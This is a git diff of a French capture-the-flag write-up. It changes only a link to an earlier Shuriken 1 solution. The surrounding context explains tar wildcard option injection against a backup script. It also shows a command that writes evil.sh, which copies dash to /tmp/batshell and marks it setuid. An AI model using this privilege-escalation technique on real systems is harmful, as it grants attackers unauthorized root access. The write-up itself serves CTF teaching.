@@ -117,7 +117,7 @@ cd /var/www/html && tar -zcf /tmp/web.tar.gz *
 #TO DO: Improve the script.
 ```
 
-Tout comme pour le [CTF Shuriken 1](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Shuriken%201%20de%20VulnHub.md) il est possible d'exploiter l'utilisation du wildcard et donc de créer des fichiers qui seront considérés comme des options à passer à `tar` :
+Tout comme pour le [CTF Shuriken 1]({% link _posts/2022-11-15-Solution-du-CTF-Shuriken-1-de-VulnHub.md %}) il est possible d'exploiter l'utilisation du wildcard et donc de créer des fichiers qui seront considérés comme des options à passer à `tar` :
 
 ```bash
 www-data@waynemanor:/var/www/html$ echo -e '#!/usr/bin/bash\ncp /usr/bin/dash /tmp/batshell\nchmod 4755 /tmp/batshell' > evil.sh
